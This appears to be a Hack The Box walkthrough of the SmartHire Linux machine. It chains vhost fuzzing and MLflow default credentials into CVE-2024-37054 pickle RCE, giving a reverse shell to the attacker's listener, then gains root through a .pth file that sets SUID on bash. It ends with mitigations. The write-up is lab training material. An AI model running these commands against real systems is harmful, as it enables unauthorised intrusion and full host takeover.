---
title: "HTB Walkthrough: SmartHire"
date: 2026-09-26
draft: false
description: "Full walkthrough of the SmartHire machine from Hack The Box. Medium difficulty, Linux. Hidden vhost discovery (models.smarthire.htb) → MLflow default credentials → RCE via insecure model deserialization (CVE-2024-37054) → shell as svcweb → root via .pth file injection into site.addsitedir() called by a sudo script."
tags: ["HackTheBox", "Linux", "Medium", "MLflow", "CVE-2024-37054", "RCE", "Deserialization", "VhostFuzzing", "PthInjection", "SudoPrivesc", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **SmartHire** on Hack The Box. **Medium** difficulty machine running **Linux**. Subdomain fuzzing uncovers a hidden vhost (`models.smarthire.htb`) serving an **MLflow** instance protected only by default credentials (`admin:password`). MLflow 2.14.1 is vulnerable to **CVE-2024-37054**: we upload a malicious model version — a `model.pkl` with a `__reduce__` reverse shell payload — promoted to `Production`, and the application executes it when loading the model for predictions. From the shell as `svcweb`, `sudo -l` reveals `mlflowctl.py` can be run as root; the script calls `site.addsitedir()` on a plugins directory **writable by our group**, allowing us to plant a `.pth` file that executes as root.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                                                              |
|----------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Name**       | SmartHire                                                                                                                                            |
| **OS**         | Linux                                                                                                                                                |
| **Difficulty** | Medium                                                                                                                                               |
| **IP**         | 10.129.245.215                                                                                                                                       |
| **Techniques** | Vhost fuzzing · MLflow default credentials · CVE-2024-37054 RCE (pickle) · `.pth` injection via `site.addsitedir()` through `sudo` NOPASSWD         |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.245.215
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
echo "10.129.245.215 smarthire.htb" >> /etc/hosts
```

### 1.2 Directory Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
  -u http://smarthire.htb/FUZZ
```

```
login       [Status: 200, Size: 6160]
register    [Status: 200, Size: 6499]
logout      [Status: 302, Size: 199]
dashboard   [Status: 302, Size: 199]
```

> **💡 Key finding:** the application has its own **user registration** — no leaked credentials needed to interact with it as an authenticated user.

### 1.3 Vhost Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://smarthire.htb/ -H "Host: FUZZ.smarthire.htb" -fc 301,302
```

```
models      [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 60ms]
```

> **💡 Attack surface:** the vhost `models.smarthire.htb` responds with an HTTP Basic Auth challenge. A `401` (rather than the generic redirect from the main host) confirms this subdomain exists and has its own backend.

---

## 2. MLflow Access — Default Credentials

`models.smarthire.htb` serves an **MLflow** instance. The default credentials are publicly known:

```bash
curl -s -u admin:password http://models.smarthire.htb/ | head -5
```

```
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>MLflow</title>
```

> **⚠️ Default credentials:** `admin:password` is valid — full access to the MLflow UI and REST API with no further effort. The version identified in the interface is **MLflow 2.14.1**, vulnerable to **CVE-2024-37054** (RCE via insecure model deserialization).

---

## 3. Exploitation — CVE-2024-37054 (MLflow Model Deserialization RCE)

MLflow 2.14.1 serialises models using `pickle`. When loading a model for inference, it deserialises `model.pkl` without validation — allowing arbitrary code execution.

### 3.1 Register and Create a Legitimate Model

First we create an account on the main application and upload training data so it registers a model in MLflow:

```bash
curl -c cookies.txt -X POST http://smarthire.htb/register \
  -d "username=testuser1&company=testcorp1&password=Password123"

curl -b cookies.txt -c cookies.txt -X POST http://smarthire.htb/login \
  -d "username=testuser1&password=Password123"

echo -e "years_experience,education_level,hired\n1,1,0\n5,2,1\n3,1,0" > train.csv
curl -b cookies.txt -X POST http://smarthire.htb/upload_hiring_data -F "file=@train.csv"
```

```json
{"message":"Model trained and registered successfully","registered_model":"testcorp1-1cd45f83431b-model","status":"success"}
```

> **💡 Why this step:** we need a model **already registered** in MLflow under our name so we can upload a malicious new version. When the application receives a `/predict` request, it loads the `Production` version — which will be ours.

### 3.2 Register a Malicious Model Version

With the listener running:

```bash
nc -lvnp 4444
```

Run the public PoC:

```bash
python3 mlflow_pickle_rce.py \
  --mlflow http://models.smarthire.htb \
  --model-name "testcorp1-1cd45f83431b-model" \
  --lhost 10.10.15.193 --lport 4444
```

```
[+] Model 'testcorp1-1cd45f83431b-model' already exists, reusing it
[+] MLmodel upload: 200
[+] model.pkl upload: 200
[+] Stage transition to 'Production': 200
[*] Now trigger whatever loads this model version in the target app
```

```
Normal flow:    mlflow.pyfunc.load_model() loads model.pkl → legitimate predictor instance
Malicious flow: model.pkl crafted with __reduce__ → during deserialization, pickle executes
                os.system("reverse shell") → outbound connection → shell as svcweb
```

### 3.3 Trigger the Malicious Model Load

```bash
echo -e "experience,skills\n3,Python" > resume.csv
curl -b cookies.txt -X POST http://smarthire.htb/predict -F "file=@resume.csv"
```

The application calls `mlflow.pyfunc.load_model()` on the `Production` version — ours — triggering the reverse shell.

### 3.4 Stabilise the Shell

```
Listening on 0.0.0.0 4444
Connection received on 10.129.245.215 53584
whoami
svcweb
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. User Flag

```bash
cat /home/svcweb/user.txt
```

> 🔑 User flag obtained.

---

## 5. Privilege Enumeration

### 5.1 Checking `sudo`

```bash
sudo -l
```

```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

### 5.2 Analysing `mlflowctl.py`

```python
from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))      # <-- runs before reading arguments

def main():
    import mlflow_actions, backup_models
    action = sys.argv[1]
    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()

if __name__ == "__main__":
    main()
```

> **⚠️ Vulnerable pattern:** the script calls `site.addsitedir()` on **every** subdirectory under `plugins/` **before checking which action was requested**. `site.addsitedir()` does more than add a directory to the import path — it also **processes any `.pth` files** it finds there. In a `.pth` file, any line starting with `import` is **executed as Python code** during that processing — and here it runs as **root**.

### 5.3 Plugin Directory Permissions

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
```

```
drwxr-xr-x 3 root root 4096  core
drwxrwxr-x 2 root devs 4096  dev
```

> **💡 Key finding:** `plugins/dev/` is **writable by the `devs` group**, which `svcweb` belongs to. There is no need to touch `plugins/core/` — planting a `.pth` in the directory we already control is enough.

---

## 6. Privilege Escalation — `.pth` Injection via `site.addsitedir()`

### 6.1 Plant the Malicious `.pth` File

```bash
echo 'import os; os.system("chmod +s /bin/bash")' \
  > /opt/tools/mlflow_ctl/plugins/dev/pwn.pth
```

### 6.2 Run the Script via `sudo`

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

```
[*] Checking MLflow service status...
[+] MLflow service status: active
```

The script exits "normally" — but `site.addsitedir()` already processed `pwn.pth` as **root** before reaching `main()`.

### 6.3 Use the SUID Binary

```bash
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

```bash
/bin/bash -p
bash-5.1# whoami
root
```

```
Normal flow:    site.addsitedir() adds directory to sys.path → imports legitimate modules
Malicious flow: .pth planted in writable directory → site.addsitedir() executes "import os; os.system(...)"
                → as root → chmod +s /bin/bash → /bin/bash -p → EUID 0
```

---

## 7. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 8. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap reveals ports 22/80. Directory fuzzing confirms a self-registration portal. Vhost fuzzing discovers `models.smarthire.htb` (401).
2. **Default credentials** → `admin:password` valid on MLflow → full UI/API access. Version: MLflow 2.14.1 (CVE-2024-37054).
3. **Legitimate model** → register at `smarthire.htb` + `/upload_hiring_data` → model `testcorp1-...-model` created in MLflow.
4. **CVE-2024-37054** → `mlflow_pickle_rce.py` uploads malicious model version (pickle with `__reduce__`) promoted to `Production`.
5. **RCE** → `/predict` with valid CSV → `mlflow.pyfunc.load_model()` deserialises `model.pkl` → reverse shell as `svcweb`.
6. **User flag** → `/home/svcweb/user.txt`.
7. **sudo** → `NOPASSWD: mlflowctl.py *` as root → script calls `site.addsitedir()` on `plugins/dev/` (writable by group `devs`).
8. **`.pth` injection** → `pwn.pth` with `import os; os.system("chmod +s /bin/bash")` → `sudo mlflowctl.py status` → `bash -p` → root.

**What I learned from this machine:**

- **`site.addsitedir()` on directories not exclusively controlled by root is a privilege escalation.** `.pth` files are not just path entries — any `import ...` line in them executes as Python code during processing. If the directory is writable by a lower-privilege user and the script runs as root, it is arbitrary code execution.

- **Internal service admin panels with default credentials are a frequent vector.** MLflow, Jupyter, Airflow, Grafana and many others ship with well-documented factory credentials. An internal service accessible with default credentials is effectively an open service to an attacker with network access.

- **CVE-2024-37054 demonstrates that loading ML models from untrusted sources is RCE.** `pickle` executes arbitrary code during deserialisation — by protocol design. ML systems that load models without verifying their provenance are inherent attack vectors. The defence requires artefact signing and isolated inference environments.

- **Vhost fuzzing is mandatory in any web enumeration.** A host returning a generic redirect may hide vhosts with completely different attack surfaces behind the same IP. `ffuf` with `-fc 301,302` filters the noise and exposes real vhosts.

- **`sudo` NOPASSWD rules over scripts that load code from dynamic paths are difficult to secure.** Even if the script itself looks safe, any directory it processes via `import`, `site.addsitedir()`, or `sys.path` entries turns the rule into a potential escalation if that path is writable by the sudoed user.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Hidden vhost discovered by subdomain fuzzing | Return identical responses for unconfigured vhosts; apply rate limiting at the reverse proxy |
| MLflow default credentials (`admin:password`) | Change credentials before any deployment; never expose admin panels with factory credentials |
| CVE-2024-37054 — RCE via model deserialization in MLflow 2.14.1 | Update MLflow to a patched version; restrict who can register/promote model versions; load models in an isolated environment |
| Application that auto-loads the "Production" model version without verifying provenance | Sign and verify model artefacts before loading; separate the model registry from the inference environment |
| `sudo` NOPASSWD over script calling `site.addsitedir()` on a writable directory | Never run as root code that processes paths writable by lower-privilege users; remove `sudo` rules over scripts with dynamic code loading |
| `plugins/dev/` writable by the `devs` group | Apply read-only permissions on any path processed with elevated privileges; separate development directories from privileged execution paths |
